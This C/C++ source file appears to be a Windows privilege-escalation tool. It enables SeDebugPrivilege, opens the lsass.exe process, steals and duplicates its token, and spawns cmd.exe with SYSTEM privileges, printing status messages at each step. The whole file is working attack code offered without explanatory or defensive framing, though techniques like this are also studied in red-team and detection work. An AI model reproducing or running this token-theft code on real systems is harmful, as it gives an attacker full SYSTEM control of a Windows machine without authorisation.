#include <stdio.h>
#include "util.hpp"

#include <string>


bool enable_debug_priv(HANDLE hToken)
{
	TOKEN_PRIVILEGES token_priv;
	LUID luid;

	if (!LookupPrivilegeValueA(0, "SeDebugPrivilege", &luid))
		return false;

	token_priv.PrivilegeCount = 1;
	token_priv.Privileges[0].Luid = luid;
	token_priv.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

	if (AdjustTokenPrivileges(hToken, FALSE, &token_priv, sizeof(TOKEN_PRIVILEGES), (PTOKEN_PRIVILEGES)0, (PDWORD)0))
		return true;
	else
		return false;
}


void main() 
{

	uint64_t PID = get_pid_by_name("lsass.exe");

	HANDLE hToken = 0;
	HANDLE hDupToken = 0;
	HANDLE hCurrentTokenHandle = 0;
	STARTUPINFO startup_info = { 0 };
	PROCESS_INFORMATION process_info = { 0 };
	startup_info.cb = sizeof(STARTUPINFO);

	OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &hCurrentTokenHandle);


	if (enable_debug_priv(hCurrentTokenHandle))
		printf("[+] Enabled debug privileges\n");
	else
		printf("[-] Failed to enable debug privileges\n");
	

	HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, TRUE, PID);
	if (hProcess != INVALID_HANDLE_VALUE && hProcess != 0)
		printf("[+] Open handle 0x%X to lsass\n", hProcess);
	else
		printf("[-] Failed to open handle to lsass\n");


	if (OpenProcessToken(hProcess, TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY | TOKEN_QUERY, &hToken))
		printf("[+] Opened lsass token\n");
	else
		printf("[-] Failed to open lsass token\n");


	if (ImpersonateLoggedOnUser(hToken))
		RevertToSelf();
	else
		printf("[-] Failed to impersonate loggon user\n");
	

	if (DuplicateTokenEx(hToken, TOKEN_ADJUST_DEFAULT | TOKEN_ADJUST_SESSIONID | TOKEN_QUERY | TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY, 0, SecurityImpersonation, TokenPrimary, &hDupToken))
		printf("[+] Duplicated lsass token\n");
	else
		printf("[-] Failed to duplicate lsass token\n");
	
	// L"C:\\Windows\\System32\\cmd.exe"
	
	if (CreateProcessWithTokenW(hDupToken, LOGON_WITH_PROFILE, L"C:\\Windows\\System32\\cmd.exe", 0, 0, 0, 0, (LPSTARTUPINFOW)&startup_info, &process_info))
		printf("[+] Spawned process with system privileges\n");
	else
		printf("[-] Failed to spawn process with system privileges\n");


	return;
}